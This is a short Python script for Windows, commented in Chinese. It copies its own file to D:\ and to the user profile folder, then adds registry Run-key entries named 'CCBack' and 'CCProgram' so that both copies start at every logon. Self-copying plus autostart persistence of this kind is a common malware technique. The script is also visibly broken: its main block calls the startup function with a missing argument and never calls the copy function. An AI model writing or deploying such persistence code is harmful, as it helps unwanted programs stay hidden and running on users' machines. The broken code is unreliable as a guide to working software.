import winreg
import shutil
import sys
import os

def add_to_startup(path, program_name): # 参数为要设置为自启动的路径
    # 获取当前用户的自启动项注册表键
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)

    # 设置自启动项的名称和值
    winreg.SetValueEx(key, program_name, 0, winreg.REG_SZ, path)

    # 关闭注册表键
    winreg.CloseKey(key)
    

# 复制自身
def copy_self_to_destination(path): # 参数为要复制的文件路径
    # 获取目标路径
    destination_lst = ['D:\\', os.environ['USERPROFILE']]  # 可选目录列表
    back_file_name = path.split("\\")[-1]
    
    for des in destination_lst:
        try:
            # 复制文件到目标路径
            shutil.copy2(path, des)
            add_to_startup(des + back_file_name, "CCBack")
            add_to_startup(path, "CCProgram")
            break
        except Exception as e:
            pass
        
    
if __name__ == "__main__":
    add_to_startup(__file__)